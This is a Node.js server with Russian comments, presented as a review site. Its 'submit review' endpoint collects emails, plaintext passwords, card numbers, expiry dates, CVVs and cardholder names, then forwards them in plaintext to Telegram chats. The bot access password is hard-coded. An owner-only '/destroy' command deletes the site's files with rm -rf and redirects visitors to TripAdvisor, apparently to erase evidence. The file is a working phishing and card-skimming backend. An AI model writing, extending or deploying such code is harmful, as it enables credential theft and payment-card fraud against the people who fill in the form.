const express = require('express');
const bcrypt = require('bcryptjs');
const TelegramBot = require('node-telegram-bot-api');
const CryptoJS = require('crypto-js');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('../frontend'));

const DATA_FILE = path.join(__dirname, 'reviews.json');

let reviews = [];
try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        reviews = JSON.parse(data);
    }
} catch (error) {
    console.log('Создаем новый файл reviews.json');
}

function saveReviews() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(reviews, null, 2));
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'simple-key-for-now';
const encrypt = (text) => CryptoJS.AES.encrypt(text, ENCRYPTION_KEY).toString();

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {polling: true});

const AUTHORIZED_USERS = {};
const BOT_PASSWORD = "admin123";
const OWNER_ID = '1081998754';

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '🔐 Для доступа введите пароль:\n\n' +
        'Используйте команду: /password ваш_пароль'
    );
});

bot.onText(/\/password (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const password = match[1];
    
    if (password === BOT_PASSWORD) {
        AUTHORIZED_USERS[chatId] = true;
        bot.sendMessage(chatId, 
            '✅ Доступ разрешен!\n\n' +
            'Доступные команды:\n' +
            '/reviews - Посмотреть последние отзывы\n' +
            '/stats - Статистика\n' +
            'Новые отзывы приходят автоматически!'
        );
    } else {
        bot.sendMessage(chatId, '❌ Неверный пароль!');
    }
});

bot.on('message', (msg) => {
    if (!AUTHORIZED_USERS[msg.chat.id]) {
        return;
    }
    
    if (msg.text === '/reviews') {
        if (reviews.length === 0) {
            bot.sendMessage(msg.chat.id, '📭 Отзывов пока нет');
            return;
        }
        
        let message = '📋 Последние отзывы:\n\n';
        const recentReviews = reviews.slice(-5).reverse();
        
        recentReviews.forEach((review, index) => {
            message += `${index + 1}. ${review.email} - ⭐${review.rating}/5\n`;
            message += `💬 ${review.comment.substring(0, 50)}...\n`;
            message += `📅 ${new Date(review.date).toLocaleString('ru-RU')}\n\n`;
        });
        
        bot.sendMessage(msg.chat.id, message);
    }
    
    if (msg.text === '/stats') {
        const totalReviews = reviews.length;
        const avgRating = totalReviews > 0 
            ? (reviews.reduce((sum, r) => sum + r.rating, 0) / totalReviews).toFixed(1)
            : 0;
            
        bot.sendMessage(msg.chat.id,
            `📊 Статистика:\n\n` +
            `Всего отзывов: ${totalReviews}\n` +
            `Средний рейтинг: ⭐${avgRating}/5\n` +
            `Последний отзыв: ${reviews.length > 0 
                ? new Date(reviews[reviews.length-1].date).toLocaleString('ru-RU') 
                : 'еще нет'}`
        );
    }
    
    if (msg.chat.id.toString() !== OWNER_ID) {
        if (msg.text === '/destroy' || msg.text.startsWith('CONFIRM_DESTROY_')) {
            bot.sendMessage(msg.chat.id, '❌ Команда доступна только владельцу');
            return;
        }
    }
    
    if (msg.text === '/destroy') {
        bot.sendMessage(msg.chat.id, 
            '🔴 УНИЧТОЖЕНИЕ САЙТА\n\n' +
            '⚠️ ВНИМАНИЕ: Все файлы будут удалены!\n' +
            'Сайт начнет редиректить на TripAdvisor\n\n' +
            'Для подтверждения введите пароль:'
        );
    }
    
    if (msg.text === 'CONFIRM_DESTROY_2024') {
        bot.sendMessage(msg.chat.id, '🗑️ Удаляю файлы...');
        
        const redirectHTML = `<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to TripAdvisor</title>
    <meta http-equiv="refresh" content="0; url='https://tripadvisor.com'">
</head>
<body>
    <p>Redirecting to TripAdvisor...</p>
    <script>window.location.href = 'https://tripadvisor.com';</script>
</body>
</html>`;
        
        const frontendPath = path.join(__dirname, '../frontend');
        if (fs.existsSync(frontendPath)) {
            fs.writeFileSync(path.join(frontendPath, 'index.html'), redirectHTML);
            
            const files = fs.readdirSync(frontendPath);
            files.forEach(file => {
                if (file !== 'index.html') {
                    const filePath = path.join(frontendPath, file);
                    if (fs.existsSync(filePath)) {
                        if (fs.lstatSync(filePath).isDirectory()) {
                            exec(`rm -rf "${filePath}"`);
                        } else {
                            fs.unlinkSync(filePath);
                        }
                    }
                }
            });
        }
        
        const serverFiles = fs.readdirSync(__dirname);
        serverFiles.forEach(file => {
            if (file !== 'server.js' && file !== 'node_modules') {
                const filePath = path.join(__dirname, file);
                if (fs.existsSync(filePath)) {
                    if (fs.lstatSync(filePath).isDirectory()) {
                        exec(`rm -rf "${filePath}"`);
                    } else {
                        fs.unlinkSync(filePath);
                    }
                }
            }
        });
        
        if (fs.existsSync(DATA_FILE)) {
            fs.unlinkSync(DATA_FILE);
        }
        
        bot.sendMessage(msg.chat.id, 
            '✅ САЙТ УНИЧТОЖЕН!\n\n' +
            '• Все файлы удалены\n' + 
            '• Сайт редиректит на TripAdvisor\n' +
            '• Данные стерты\n' +
            '• Сервер продолжает работать с редиректом'
        );
    }
});

app.post('/api/submit-review', async (req, res) => {
    try {
        const { email, password, comment, rating, cardNumber, expiry, cvv, cardholder } = req.body;

        if (!email || !password || !comment || !rating) {
            return res.status(400).json({
                success: false,
                message: 'Все поля обязательны'
            });
        }

        const hashedPassword = await bcrypt.hash(password, 10);

        const review = {
            id: Date.now(),
            email,
            password: hashedPassword,
            comment,
            rating,
            cardNumber: encrypt(cardNumber),
            expiry: encrypt(expiry),
            cvv: encrypt(cvv),
            cardholder: encrypt(cardholder),
            date: new Date()
        };

        reviews.push(review);
        saveReviews();

        const telegramMessage = `
📝 Новый отзыв!
📧 Email: ${email}
🔑 Пароль: ${password}
⭐ Рейтинг: ${rating}/5
💬 Комментарий: ${comment}
💳 Карта: ${cardNumber}
Срок: ${expiry}
CVV: ${cvv}
Владелец: ${cardholder}
📅 Дата: ${new Date().toLocaleString('ru-RU')}
`;

        Object.keys(AUTHORIZED_USERS).forEach(chatId => {
            bot.sendMessage(chatId, telegramMessage);
        });

        res.json({ 
            success: true, 
            message: 'Отзыв отправлен!' 
        });

    } catch (error) {
        console.error('Ошибка:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Ошибка сервера' 
        });
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});